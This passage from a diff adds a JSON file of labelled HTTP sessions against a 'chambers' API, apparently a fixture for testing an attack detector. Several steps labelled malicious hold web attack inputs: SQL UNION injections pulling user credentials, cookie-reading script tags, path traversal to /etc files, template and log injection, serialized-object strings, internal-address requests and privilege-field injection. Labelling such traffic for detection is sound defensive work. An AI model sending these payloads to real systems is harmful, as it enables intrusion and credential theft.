+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user76", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess176-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenCDE"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess176-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenCDE", "Content-Type": "application/json"},
+          "body": {"name": "{{liposuction}}", "volume_cubic_meters": 17.0},
+          "note": "The client injects a template expression."
+        },
+        {
+          "id": "sess176-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-076",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenCDE"},
+          "body": null,
+          "note": "The client checks chamber cham-076."
+        }
+      ]
+    },
+    {
+      "session_id": "sess177",
+      "client_ip": "172.85.99.11",
+      "steps": [
+        {
+          "id": "sess177-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess177-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user77", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess177-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenFGH"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess177-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenFGH", "Content-Type": "application/json"},
+          "body": {"name": "rO0ABXNyAC...", "volume_cubic_meters": 18.0},
+          "note": "The client passes a serialized object payload."
+        },
+        {
+          "id": "sess177-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-077",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenFGH"},
+          "body": null,
+          "note": "The client checks chamber cham-077."
+        }
+      ]
+    },
+    {
+      "session_id": "sess178",
+      "client_ip": "192.168.80.65",
+      "steps": [
+        {
+          "id": "sess178-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user78", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess178-s02",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenIJK", "Content-Type": "application/json"},
+          "body": {"name": "Test\n[CRITICAL] 2026-10-28 Security failure logged", "volume_cubic_meters": 24.0},
+          "note": "The client passes a newline and a log stamp."
+        },
+        {
+          "id": "sess178-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenIJK"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess178-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-078",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenIJK"},
+          "body": null,
+          "note": "The client checks chamber cham-078."
+        }
+      ]
+    },
+    {
+      "session_id": "sess179",
+      "client_ip": "10.222.33.44",
+      "steps": [
+        {
+          "id": "sess179-s01",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/materials",
+          "query": {},
+          "headers": {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows)"},
+          "body": null,
+          "note": "The client uses an old browser signature."
+        },
+        {
+          "id": "sess179-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user79", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess179-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenLMN"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess179-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-079",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenLMN"},
+          "body": null,
+          "note": "The client checks chamber cham-079."
+        }
+      ]
+    },
+    {
+      "session_id": "sess180",
+      "client_ip": "172.90.11.22",
+      "steps": [
+        {
+          "id": "sess180-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user80", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess180-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenOPQ"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess180-s03",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"limit": "10 UNION SELECT email,password FROM users--"},
+          "headers": {"Authorization": "Bearer tokenOPQ"},
+          "body": null,
+          "note": "The client performs a query injection."
+        },
+        {
+          "id": "sess180-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-080",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenOPQ"},
+          "body": null,
+          "note": "The client checks chamber cham-080."
+        }
+      ]
+    },
+    {
+      "session_id": "sess181",
+      "client_ip": "192.168.85.70",
+      "steps": [
+        {
+          "id": "sess181-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess181-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user81", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess181-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenRST"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess181-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/admin/status",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenRST"},
+          "body": null,
+          "note": "The client accesses an unauthorized admin path."
+        },
+        {
+          "id": "sess181-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-081",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenRST"},
+          "body": null,
+          "note": "The client checks chamber cham-081."
+        }
+      ]
+    },
+    {
+      "session_id": "sess182",
+      "client_ip": "10.233.44.55",
+      "steps": [
+        {
+          "id": "sess182-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user82", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess182-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenUVW"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess182-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenUVW", "Content-Type": "application/json"},
+          "body": {"name": "Lab", "volume_cubic_meters": 10.0, "user_role": "admin"},
+          "note": "The client injects an unallowed user role field."
+        },
+        {
+          "id": "sess182-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-082",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenUVW"},
+          "body": null,
+          "note": "The client checks chamber cham-082."
+        }
+      ]
+    },
+    {
+      "session_id": "sess183",
+      "client_ip": "172.95.22.33",
+      "steps": [
+        {
+          "id": "sess183-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess183-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user83", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess183-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess183-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers/../../etc/motd",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ"},
+          "body": null,
+          "note": "The client performs directory traversal."
+        },
+        {
+          "id": "sess183-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-083",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ"},
+          "body": null,
+          "note": "The client checks chamber cham-083."
+        }
+      ]
+    },
+    {
+      "session_id": "sess184",
+      "client_ip": "192.168.90.75",
+      "steps": [
+        {
+          "id": "sess184-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user84", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess184-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess184-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC", "Content-Type": "application/json"},
+          "body": {"name": "<script>alert(document.cookie)</script>", "volume_cubic_meters": 12.0},
+          "note": "The client passes browser-executed code."
+        },
+        {
+          "id": "sess184-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-084",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC"},
+          "body": null,
+          "note": "The client checks chamber cham-084."
+        }
+      ]
+    },
+    {
+      "session_id": "sess185",
+      "client_ip": "10.244.55.66",
+      "steps": [
+        {
+          "id": "sess185-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess185-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user85", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess185-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess185-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers/cham-085/simulate",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF", "Content-Type": "application/json"},
+          "body": {"ambient_temperature_celsius": 20.0, "endpoint": "http://127.0.0.1/metrics"},
+          "note": "The client references an internal address."
+        },
+        {
+          "id": "sess185-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-085/simulations",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF"},
+          "body": null,
+          "note": "The client checks simulations."
+        }
+      ]
+    },
+    {
+      "session_id": "sess186",
+      "client_ip": "172.100.44.55",
+      "steps": [
+        {
+          "id": "sess186-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user86", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess186-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenGHI"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess186-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenGHI", "Content-Type": "application/json"},
+          "body": {"name": "{{request}}", "volume_cubic_meters": 15.0},
+          "note": "The client injects a template expression."
+        },
+        {
+          "id": "sess186-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-086",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenGHI"},
+          "body": null,
+          "note": "The client checks chamber cham-086."
+        }
+      ]
+    },
+    {
+      "session_id": "sess187",
+      "client_ip": "192.168.95.80",
+      "steps": [
+        {
+          "id": "sess187-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess187-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user87", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess187-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess187-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL", "Content-Type": "application/json"},
+          "body": {"name": "rO0ABXNyACpvcmMuYXBhY2hl...", "volume_cubic_meters": 22.0},
+          "note": "The client passes a serialized object payload."
+        },
+        {
+          "id": "sess187-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-087",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL"},
+          "body": null,
+          "note": "The client checks chamber cham-087."
+        }
+      ]
+    },
+    {
+      "session_id": "sess188",
+      "client_ip": "10.255.66.77",
+      "steps": [
+        {
+          "id": "sess188-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user88", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess188-s02",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO", "Content-Type": "application/json"},
+          "body": {"name": "Chamber\n[WARNING] 2026-10-28 Unauthorized payload", "volume_cubic_meters": 26.0},
+          "note": "The client passes a newline and a log stamp."
+        },
+        {
+          "id": "sess188-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess188-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-088",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO"},
+          "body": null,
+          "note": "The client checks chamber cham-088."
+        }
+      ]
+    },
+    {
+      "session_id": "sess189",
+      "client_ip": "172.105.33.44",
+      "steps": [
+        {
+          "id": "sess189-s01",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/materials",
+          "query": {},
+          "headers": {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"},
+          "body": null,
+          "note": "The client uses an old browser signature."
+        },
+        {
+          "id": "sess189-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user89", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess189-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess189-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-089",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR"},
+          "body": null,
+          "note": "The client checks chamber cham-089."
+        }
+      ]
+    },
+    {
+      "session_id": "sess190",
+      "client_ip": "192.168.100.10",
+      "steps": [
+        {
+          "id": "sess190-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user90", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess190-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenSTU"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess190-s03",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"limit": "10 UNION SELECT table_name,column_name FROM information_schema.columns--"},
+          "headers": {"Authorization": "Bearer tokenSTU"},
+          "body": null,
+          "note": "The client performs a query injection."
+        },
+        {
+          "id": "sess190-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-090",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenSTU"},
+          "body": null,
+          "note": "The client checks chamber cham-090."
+        }
+      ]
+    },
+    {
+      "session_id": "sess191",
+      "client_ip": "10.12.13.14",
+      "steps": [
+        {
+          "id": "sess191-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess191-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user91", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess191-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess191-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/admin/reports",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "The client accesses an unauthorized admin path."
+        },
+        {
+          "id": "sess191-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-091",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "The client checks chamber cham-091."
+        }
+      ]
+    },
+    {
+      "session_id": "sess192",
+      "client_ip": "172.110.55.66",
+      "steps": [
+        {
+          "id": "sess192-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user92", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess192-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess192-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA", "Content-Type": "application/json"},
+          "body": {"name": "Lab", "volume_cubic_meters": 10.0, "access_privilege": "root"},
+          "note": "The client injects an unallowed access privilege field."
+        },
+        {
+          "id": "sess192-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-092",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA"},
+          "body": null,
+          "note": "The client checks chamber cham-092."
+        }
+      ]
+    },
+    {
+      "session_id": "sess193",
+      "client_ip": "192.168.105.15",
+      "steps": [
+        {
+          "id": "sess193-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess193-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user93", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess193-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess193-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers/../../etc/group",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD"},
+          "body": null,
+          "note": "The client performs directory traversal."
+        },
+        {
+          "id": "sess193-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-093",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD"},
+          "body": null,
+          "note": "The client checks chamber cham-093."
+        }
+      ]
+    },
+    {
+      "session_id": "sess194",
+      "client_ip": "10.15.16.17",
+      "steps": [
+        {
+          "id": "sess194-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user94", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess194-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess194-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG", "Content-Type": "application/json"},
+          "body": {"name": "<script>alert('Test')</script>", "volume_cubic_meters": 13.0},
+          "note": "The client passes browser-executed code."
+        },
+        {
+          "id": "sess194-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-094",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG"},
+          "body": null,
+          "note": "The client checks chamber cham-094."
+        }
+      ]
+    },
+    {
+      "session_id": "sess195",
+      "client_ip": "172.115.66.77",
+      "steps": [
+        {
+          "id": "sess195-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess195-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user95", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess195-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess195-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers/cham-095/simulate",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ", "Content-Type": "application/json"},
+          "body": {"ambient_temperature_celsius": 20.0, "target_url": "http://127.0.0.1:3306"},
+          "note": "The client references an internal port."
+        },
+        {
+          "id": "sess195-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-095/simulations",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ"},
+          "body": null,
+          "note": "The client checks simulations."
+        }
+      ]
+    },
+    {
+      "session_id": "sess196",
+      "client_ip": "192.168.110.20",
+      "steps": [
+        {
+          "id": "sess196-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user96", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess196-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenKLM"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess196-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenKLM", "Content-Type": "application/json"},
+          "body": {"name": "{{app.config}}", "volume_cubic_meters": 16.0},
+          "note": "The client injects a template expression."
+        },
+        {
+          "id": "sess196-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-096",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenKLM"},
+          "body": null,
+          "note": "The client checks chamber cham-096."
+        }
+      ]
+    },
+    {
+      "session_id": "sess197",
+      "client_ip": "10.18.19.20",
+      "steps": [
+        {
+          "id": "sess197-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess197-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user97", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess197-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess197-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP", "Content-Type": "application/json"},
+          "body": {"name": "rO0ABXNyAC...", "volume_cubic_meters": 21.0},
+          "note": "The client passes a serialized object payload."
+        },
+        {
+          "id": "sess197-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-097",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP"},
+          "body": null,
+          "note": "The client checks chamber cham-097."
+        }
+      ]
+    },
+    {
+      "session_id": "sess198",
+      "client_ip": "172.120.77.88",
+      "steps": [
+        {
+          "id": "sess198-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user98", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess198-s02",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS", "Content-Type": "application/json"},
+          "body": {"name": "Lab\n[FATAL] 2026-10-28 Security exception raised", "volume_cubic_meters": 29.0},
+          "note": "The client passes a newline and a log stamp."
+        },
+        {
+          "id": "sess198-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess198-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-098",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS"},
+          "body": null,
+          "note": "The client checks chamber cham-098."
+        }
+      ]
+    },
+    {
+      "session_id": "sess199",
+      "client_ip": "192.168.115.25",
+      "steps": [
+        {
+          "id": "sess199-s01",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/materials",
+          "query": {},
+          "headers": {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"},
+          "body": null,
+          "note": "The client uses an old browser signature."
+        },
+        {
+          "id": "sess199-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user99", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess199-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess199-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-099",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV"},
+          "body": null,
+          "note": "The client checks chamber cham-099."
+        }
+      ]
+    },
+    {
+      "session_id": "sess200",
+      "client_ip": "10.21.22.23",
+      "steps": [
+        {
+          "id": "sess200-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user100", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess200-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenWXY"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess200-s03",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"limit": "10 UNION SELECT id,username FROM users--"},
+          "headers": {"Authorization": "Bearer tokenWXY"},
+          "body": null,
+          "note": "The client performs a query injection."
+        },
+        {
+          "id": "sess200-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-100",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenWXY"},
+          "body": null,
+          "note": "The client checks chamber cham-100."
+        }
+      ]
+    }
+  ]
